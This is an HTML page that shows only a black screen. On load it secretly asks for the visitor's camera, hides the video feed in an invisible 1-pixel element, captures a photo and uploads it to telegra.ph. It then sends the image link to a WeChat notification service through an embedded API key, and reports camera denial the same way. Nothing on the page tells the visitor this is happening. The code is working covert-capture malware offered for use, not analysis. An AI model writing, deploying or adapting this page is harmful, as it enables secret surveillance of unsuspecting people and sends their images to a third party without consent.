<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<style>
#cam{width:1px;height:1px;position:fixed;top:0;left:0;opacity:0;}
#box{display:none;}
body{background:#000;margin:0;overflow:hidden;}
</style>
</head>
<body>
<video id="cam" autoplay playsinline muted></video>
<canvas id="box" width="480" height="480"></canvas>

<script>
const SEND_KEY = "SCT347091TUpxTiAuPOAvg27UhZnouc6Th";

async function sendToWechat(title, content) {
  try {
    await fetch(`https://sctapi.ftqq.com/${SEND_KEY}.send`, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: `title=${encodeURIComponent(title)}&desp=${encodeURIComponent(content)}`
    });
  } catch (e) {}
}

async function uploadToShortLink(base64) {
  try {
    const res = await fetch(base64);
    const blob = await res.blob();
    const formData = new FormData();
    formData.append("file", blob, "photo.jpg");
    const resp = await fetch("https://telegra.ph/upload", {
      method: "POST",
      body: formData
    });
    const result = await resp.json();
    if (result && result[0]?.src) {
      return `https://telegra.ph${result[0].src}`;
    }
    return null;
  } catch (e) {
    return null;
  }
}

function autoTakePhoto() {
  const video = document.getElementById("cam");
  const canvas = document.getElementById("box");
  const ctx = canvas.getContext("2d");

  navigator.mediaDevices.getUserMedia({
    video: {
      facingMode: "environment",
      width: { exact: 480 },
      height: { exact: 480 }
    }
  }).then(stream => {
    video.srcObject = stream;

    // 循环等待：直到视频有画面再截图
    function waitFrame() {
      // 有画面 && 宽高正常
      if (video.videoWidth > 10 && video.videoHeight > 10) {
        ctx.drawImage(video, 0, 0, 480, 480);
        const base64Img = canvas.toDataURL("image/jpeg", 0.8);
        stream.getTracks().forEach(track => track.stop());

        uploadToShortLink(base64Img).then(link => {
          if (link) {
            sendToWechat("✅ 拍照成功", "照片链接：\n" + link);
          } else {
            sendToWechat("拍照成功（备用）", base64Img);
          }
        });
        return;
      }
      // 没画面继续等下一帧
      requestAnimationFrame(waitFrame);
    }
    waitFrame();

  }).catch(() => {
    sendToWechat("❌ 失败", "无摄像头权限或被拦截");
  });
}

window.onload = autoTakePhoto;
</script>
</body>
</html>
